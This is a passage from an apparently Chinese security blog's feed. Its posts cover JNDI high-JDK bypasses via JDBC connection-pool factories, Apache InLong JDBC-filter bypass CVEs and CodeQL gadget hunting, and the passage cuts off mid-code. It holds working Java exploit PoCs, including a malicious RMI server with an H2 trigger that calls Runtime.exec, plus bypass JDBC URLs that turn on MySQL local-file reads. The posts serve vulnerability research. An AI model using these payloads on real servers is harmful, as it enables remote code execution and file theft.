href="https://docs.spring.io/spring-security/site/docs/5.6.3/api/org/springframework/security/oauth2/core/endpoint/OAuth2AuthorizationResponseType.html">https://docs.spring.io/spring-security/site/docs/5.6.3/api/org/springframework/security/oauth2/core/endpoint/OAuth2AuthorizationResponseType.html</a></p><p>Vulhub</p>]]></content>
    
    
    
    <tags>
      
      <tag>java security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNDI高版本绕过之JDBCAttack总结</title>
    <link href="/2024/06/06/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E4%B9%8BJDBCAttack%E6%80%BB%E7%BB%93/"/>
    <url>/2024/06/06/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E4%B9%8BJDBCAttack%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最初是在浅蓝师傅的JNDI高版本绕过里见到的，最近又碰到了，当时学的也不太全面，这里回过头学一下，对常见的连接池的利用做一个总结</p><p>同样的这些也可以作为高版本JDK绕过的getter sinks，本文全篇利用H2数据库用作来演示攻击。</p><h1 id="dbcp"><a href="#dbcp" class="headerlink" title="dbcp"></a>dbcp</h1><p>可以直接参考<a href="https://tttang.com/archive/1405/#toc_dbcp">https://tttang.com/archive/1405/#toc_dbcp</a></p><p>分为tomcat dbcp和commons-dbcp, 每个又分为两个版本，看情况修改factory名字即可, 这里测试用的是commons-dbcp 1.4的factory</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilRmiServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lanuchRMIregister</span><span class="hljs-params">(Integer rmi_port)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        System.out.println(<span class="hljs-string">&quot;Creating RMI Registry, RMI Port:&quot;</span>+rmi_port);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(rmi_port);<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> exec();<br><br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>, referenceWrapper);<br>        System.out.println(referenceWrapper.getReference());<br>        <br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResourceRef <span class="hljs-title function_">exec</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;org.apache.commons.dbcp.BasicDataSourceFactory&quot;</span>;<br><br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,factory,<span class="hljs-literal">null</span>);<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;driverClassName&quot;</span>, <span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>                <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +<br>                <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;&quot;</span>+<span class="hljs-string">&quot;open -a Calculator&quot;</span>+<span class="hljs-string">&quot;&#x27;)\n&quot;</span> +<br>                <span class="hljs-string">&quot;$$\n&quot;</span>;<br><br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;driverClassName&quot;</span>,<span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;url&quot;</span>,JDBC_URL));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;password&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;initialSize&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>));<br>        <span class="hljs-keyword">return</span> ref;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        lanuchRMIregister(<span class="hljs-number">1099</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();        initialContext.lookup(<span class="hljs-string">&quot;rmi://localhost:1099/Exploit&quot;</span>);<br></code></pre></td></tr></table></figure><p>其他：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><span class="hljs-selector-class">.dbcp</span><span class="hljs-selector-class">.dbcp2</span><span class="hljs-selector-class">.BasicDataSourceFactory</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><span class="hljs-selector-class">.dbcp</span><span class="hljs-selector-class">.dbcp</span><span class="hljs-selector-class">.BasicDataSourceFactory</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.dbcp2</span><span class="hljs-selector-class">.BasicDataSourceFactory</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.dbcp</span>.BasicDataSourceFactory<br></code></pre></td></tr></table></figure><h1 id="tomcat-jdbc"><a href="#tomcat-jdbc" class="headerlink" title="tomcat-jdbc"></a>tomcat-jdbc</h1><p>修改factory为org.apache.tomcat.jdbc.pool.DataSourceFactory 即可</p><h1 id="druid"><a href="#druid" class="headerlink" title="druid"></a>druid</h1><p>测试用的druid最新版1.2.23仍然可以打。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResourceRef <span class="hljs-title function_">exec</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;</span>;<br><br>    <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,factory,<span class="hljs-literal">null</span>);<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;driverClassName&quot;</span>, <span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>            <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +<br>            <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;&quot;</span>+<span class="hljs-string">&quot;open -a Calculator&quot;</span>+<span class="hljs-string">&quot;&#x27;)\n&quot;</span> +<br>            <span class="hljs-string">&quot;$$\n&quot;</span>;<br><br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_USER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_PASSWORD</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;password&quot;</span>;<br><br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;driverClassName&quot;</span>,<span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;url&quot;</span>,JDBC_URL));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;username&quot;</span>,JDBC_USER));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;password&quot;</span>,JDBC_PASSWORD));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;initialSize&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;init&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>));<br><br>    <span class="hljs-keyword">return</span> ref;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="HikariCP"><a href="#HikariCP" class="headerlink" title="HikariCP"></a>HikariCP</h1><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResourceRef <span class="hljs-title">exec</span>()</span> &#123;<br>        ResourceRef <span class="hljs-keyword">ref</span> = <span class="hljs-keyword">new</span> ResourceRef(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;com.zaxxer.hikari.HikariJNDIFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;driverClassName&quot;</span>, <span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>        String JDBC_URL = <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>                <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +<br>                <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;&quot;</span>+<span class="hljs-string">&quot;open -a Calculator&quot;</span>+<span class="hljs-string">&quot;&#x27;)\n&quot;</span> +<br>                <span class="hljs-string">&quot;$$\n&quot;</span>;<br>        <span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;jdbcUrl&quot;</span>, JDBC_URL));<br>        <span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-string">&quot;&quot;</span>));<br>        <span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;password&quot;</span>,<span class="hljs-string">&quot;&quot;</span>));<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">ref</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>com.zaxxer.hikari.HikariJNDIFactory</p><h1 id="vibur-dbcp"><a href="#vibur-dbcp" class="headerlink" title="vibur-dbcp"></a>vibur-dbcp</h1><p>找了个小众的组件看了看。</p><p><img src="/../JNDI_WITH_JDBC/image-20240606153556479.png" alt="image-20240606153556479"></p><p>dataSource.start() 明显就是连接的逻辑。</p><p>直接给poc：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResourceRef <span class="hljs-title">exec</span>()</span> &#123;<br>        ResourceRef <span class="hljs-keyword">ref</span> = <span class="hljs-keyword">new</span> ResourceRef(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.vibur.dbcp.ViburDBCPObjectFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;driverClassName&quot;</span>, <span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>        String JDBC_URL = <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>                <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +<br>                <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;&quot;</span>+<span class="hljs-string">&quot;open -a Calculator&quot;</span>+<span class="hljs-string">&quot;&#x27;)\n&quot;</span> +<br>                <span class="hljs-string">&quot;$$\n&quot;</span>;<br>        <span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;jdbcUrl&quot;</span>, JDBC_URL));<br>        <span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-string">&quot;&quot;</span>));<br>        <span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;password&quot;</span>,<span class="hljs-string">&quot;&quot;</span>));<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">ref</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="其他没法利用的"><a href="#其他没法利用的" class="headerlink" title="其他没法利用的"></a>其他没法利用的</h1><h2 id="c3p0"><a href="#c3p0" class="headerlink" title="c3p0"></a>c3p0</h2><p>C3p0 低版本0.9只有一个JavaBeanObjectFactory, 可能有点用吧可以调用任意seter。</p><p><img src="/../JNDI_WITH_JDBC/image-20240606160251340.png" alt="image-20240606160251340"></p><p><img src="/../JNDI_WITH_JDBC/image-20240606160310805.png" alt="image-20240606160310805"></p><p>此处newInstance也没参数可控。</p><p>还有一处反序列化：</p><p><img src="/../JNDI_WITH_JDBC/image-20240606160705343.png" alt="image-20240606160705343"></p><p>SerializableUtils#deserializeFromByteArray</p><p><img src="/../JNDI_WITH_JDBC/image-20240606160714169.png" alt="image-20240606160714169"></p><p>JNDI本身就能打反序列化，意义也不大。</p><p>稍微高点的版本分了两个包，在mchange-commons-java里，多了一个实现ObjectFactory的类：</p><p>DriverManagerDataSource.DmdsObjectFactory#getObjectInstance</p><p><img src="/../JNDI_WITH_JDBC/image-20240606163536294.png" alt="image-20240606163536294"></p><p>这里new了个DriverManagerDataSource，但是很可惜DriverManagerDataSource构造函数就是个赋值，也没法利用</p><p><img src="/../JNDI_WITH_JDBC/image-20240606163618343.png" alt="image-20240606163618343"></p><h2 id="spring-jdbc"><a href="#spring-jdbc" class="headerlink" title="spring-jdbc"></a>spring-jdbc</h2><p>出于好奇看了下spring-jdbc这种应该很热门的东西为啥文章里没，全局搜索了下jar包根本就没有implements ObjectFactory的类。</p><p>试了2.0 3.0 和6.x的几个版本，也是没有。所以没法利用。</p><h2 id="BoneCP"><a href="#BoneCP" class="headerlink" title="BoneCP"></a>BoneCP</h2><p>这个倒是有，但是他的getObjectInstance没连接逻辑。</p><p><img src="/../JNDI_WITH_JDBC/image-20240606165030499.png" alt="image-20240606165030499"></p><p>上面都是属性设置，可能有用的就最后两行。</p><p>看看BoneCPDataSource的构造函数</p><p><img src="/../JNDI_WITH_JDBC/image-20240606165135834.png" alt="image-20240606165135834"></p><p>反射赋个值，也是利用不了。</p><p>参考文章或项目：</p><p><a href="https://tttang.com/archive/1405/">https://tttang.com/archive/1405/</a></p><p><a href="https://xz.aliyun.com/t/14044">https://xz.aliyun.com/t/14044</a></p><p><a href="https://github.com/luelueking/Deserial_Sink_With_JDBC">https://github.com/luelueking/Deserial_Sink_With_JDBC</a></p><p>w</p>]]></content>
    
    
    
    <tags>
      
      <tag>java security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache-Inlong-JDBCAttack历史绕过学习</title>
    <link href="/2024/05/20/Apache-Inlong-JDBCAttack%E5%8E%86%E5%8F%B2%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/05/20/Apache-Inlong-JDBCAttack%E5%8E%86%E5%8F%B2%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>OSCS在5月9日更新了一个inlong的通告，是关于JDBC的攻击的。<br>在看最新绕过之前，先看看历史漏洞是怎么样的。</p><h1 id="CVE-2023-34434"><a href="#CVE-2023-34434" class="headerlink" title="CVE-2023-34434"></a>CVE-2023-34434</h1><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>没具体看，看了下通告，最初的绕过是把危险参数的value通过大小写绕过，true换成TRue就可绕过。</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://github.com/apache/inlong/commit/8390f8182457f76c87c66d45d3e5904cc5a08bb5#diff-45d94c999b307075e81525a2d60fd5c44fcd41183ad98ff3373b8109e0aa0c51">https://github.com/apache/inlong/commit/8390f8182457f76c87c66d45d3e5904cc5a08bb5#diff-45d94c999b307075e81525a2d60fd5c44fcd41183ad98ff3373b8109e0aa0c51</a></p><p><img src="/../Inlong_jdbc/image-20240520212102270.png" alt="image-20240520212102270"></p><p>这段自定义了SENSITIVE_REPLACE_PARAM_MAP和SENSITIVE_REMOVE_PARAM_MAP, 然后写了个filter<br><img src="/../Inlong_jdbc/image-20240520212124112.png" alt="image-20240520212124112"><br>这里最开始直接用了URLDecoder.decode， url编码绕过无效。<br>然后把querystring部分截下来，打成key-value形式后丢进queryMap，然后和上面两个黑名单Map对比是否匹配。如果匹配到危险参数，就做删除或替换操作。最后再加到连接的url后面。</p><h1 id="CVE-2023-43668"><a href="#CVE-2023-43668" class="headerlink" title="CVE-2023-43668"></a>CVE-2023-43668</h1><p>在mysql-connector在8.0.1x中（某个版本修复了），可以通过allowLoadLocalInFile来完成任意文件读取，这个选项默认为true。<br>所以如果不添加任何参数，就不会走到敏感参数检查的判断里，所以仍然存在任意文件读取。<br>而inlong的jar包刚好没有超过修复版本，这也导致了CVE-2023-43668</p><h1 id="CVE-2023-46227"><a href="#CVE-2023-46227" class="headerlink" title="CVE-2023-46227"></a>CVE-2023-46227</h1><p>利用<code>\t</code>符号进行绕过，实际上不止<code>\t</code>,所有空白符都可以，这个和mysql-connector源码有关。</p><p>比如用<code>\f</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);            DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/test?\fallowLoadLocalInfile=true&quot;</span>);<br></code></pre></td></tr></table></figure><p>在ConnectionUrlParser#parseQuerySection打断点。<br><img src="/../Inlong_jdbc/image-20240520212202636.png" alt="image-20240520212202636"><br>问了下gpt。<br><img src="/../Inlong_jdbc/image-20240520212212848.png" alt="image-20240520212212848"><br>所以随便插个空白符就能绕了。</p><h2 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h2><p>连同43668在1.9.0版本修复了，过滤了所有空白符。<br>同时mysql-connector包也更新到了安全版本.<br><img src="/../Inlong_jdbc/image-20240520212229029.png" alt="image-20240520212229029"><br>8.0.20版本及以上还修复了反序列化，之后的绕过也只能打任意文件读取了。</p><h1 id="CVE-2024-26579"><a href="#CVE-2024-26579" class="headerlink" title="CVE-2024-26579"></a>CVE-2024-26579</h1><p>新版本过滤的逻辑也有点变动，要看一下。<br><img src="/../Inlong_jdbc/image-20240520212243753.png" alt="image-20240520212243753"><br>与之前不同的是，遍历的时候添加了一个paramList，如果监测到危险参数就直接continue，不添加到paramList去。<br>最后在paramList把SENSITIVE_REPLACE_PARAM_MAP给丢进去，相当于一个覆盖操作。</p><p>我在mysql-connector源码跟了半天流程看看传参数有没有其他处理方法，没找到。<br>官方文档：<br><a href="https://dev.mysql.com/doc/connector-j/en/connector-j-reference-jdbc-url-format.html">https://dev.mysql.com/doc/connector-j/en/connector-j-reference-jdbc-url-format.html</a></p><p>mysql的连接语法，可以用（）添加参数。<br><img src="/../Inlong_jdbc/image-20240520212258688.png" alt="image-20240520212258688"><br>这样传参数便可以绕过敏感参数检查，后面再加#还可以注释掉REPLACE_MAP添加进的内容。从而绕过。</p><p>发现者的绕过：<br><img src="/../Inlong_jdbc/image-20240520212315998.png" alt="image-20240520212315998"></p><p><img src="/../Inlong_jdbc/image-20240520212326395.png" alt="image-20240520212326395">看起来也是有点奇怪。</p><p>或者，更标准的写法：<br><code>jdbc:mysql://(host=127.0.0.1,port=3306,allowLoadLocalInfile=true)/test?maxAllowedPacket=655360#</code></p><p>参考：<br><a href="https://github.com/rmb122/rogue_mysql_server.git">https://github.com/rmb122/rogue_mysql_server.git</a><br><a href="https://www.oscs1024.com/hd/MPS-7rbq-ze46">https://www.oscs1024.com/hd/MPS-7rbq-ze46</a><br><a href="https://avd.aliyun.com/search?q=inlong">https://avd.aliyun.com/search?q=inlong</a><br><a href="https://mp.weixin.qq.com/s/lmoWKK41ZQzZOh-P26VUng">https://mp.weixin.qq.com/s/lmoWKK41ZQzZOh-P26VUng</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>codeaudit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/04/12/Dubbo-hessianLite-CVE-2021-43297%E5%88%86%E6%9E%90/"/>
    <url>/2024/04/12/Dubbo-hessianLite-CVE-2021-43297%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>codeql使用小记</title>
    <link href="/2024/04/08/codeql%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0_and_fastjson%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <url>/2024/04/08/codeql%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0_and_fastjson%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
    
    <content type="html"><![CDATA[<p>例题SUSCTF 2022 gadget , 可以参考<a href="https://www.secpulse.com/archives/180773.html">使用CodeQL分析CTF题目 - SecPulse.COM | 安全脉搏</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>采用fastjson 1.2.36，文章作者在github clone下来2.2.1版本然后编译。</p><p>不得不说java的版本兼容就是依托史，换了好几个maven和java版本均不行，有的报错查都查不到。。。</p><p>忘了在哪找了个附件quartz.jar， 决定用反编译来搭建环境。</p><p>使用github项目<a href="https://github.com/ttonys/CodeQLAnalyseJar">https://github.com/ttonys/CodeQLAnalyseJar</a></p><p>跑起来又尼玛报错，看着好像是操作系统不一样导致的，我一直用的windows。</p><p>最终决定用jadx反编译后保存一下，丢进src1目录：</p><p><img src="/../codeqlWithFastjson/image-20240408112532050.png" alt="image-20240408112532050"></p><p>然后ant -f build.xml ， 可以运行。</p><p>构建：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">codeql database create e:<span class="hljs-string">/codeaudit/codeql/databases/quartz</span> <span class="hljs-params">--language=java</span> <span class="hljs-params">--command=</span><span class="hljs-string">&quot;ant -f build.xml&quot;</span> <span class="hljs-params">--source-root=e</span>:<span class="hljs-string">/your-source-root</span> <span class="hljs-params">--overwrite</span><br></code></pre></td></tr></table></figure><h1 id="链子查找"><a href="#链子查找" class="headerlink" title="链子查找"></a>链子查找</h1><p>直接用这个：</p><p><a href="https://xz.aliyun.com/t/7482">https://xz.aliyun.com/t/7482</a></p><p>核心代码在这：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">MethodAccess</span> <span class="hljs-selector-tag">seekSink</span>(Method sourceMethod)&#123;<br>    <span class="hljs-selector-tag">exists</span>(<br>        MethodAccess ma, Method method|<br>        (ma.<span class="hljs-built_in">getEnclosingStmt</span>() = sourceMethod.<span class="hljs-built_in">getBody</span>().getAChild*() <span class="hljs-keyword">and</span><br>        method = ma.<span class="hljs-built_in">getMethod</span>()) or<br>        (ma.<span class="hljs-built_in">getEnclosingStmt</span>() = sourceMethod.<span class="hljs-built_in">getBody</span>().getAChild*() <span class="hljs-keyword">and</span> ma.<span class="hljs-built_in">getArgument</span>(<span class="hljs-number">0</span>).(ClassInstanceExpr).<span class="hljs-built_in">getAnonymousClass</span>().<span class="hljs-built_in">isAnonymous</span>() <span class="hljs-keyword">and</span> method = ma.<span class="hljs-built_in">getArgument</span>(<span class="hljs-number">0</span>).(ClassInstanceExpr).<span class="hljs-built_in">getAnonymousClass</span>().<span class="hljs-built_in">getAMethod</span>())|<br>        if method instanceof JNDIMethod<br>        then result = ma<br>        else 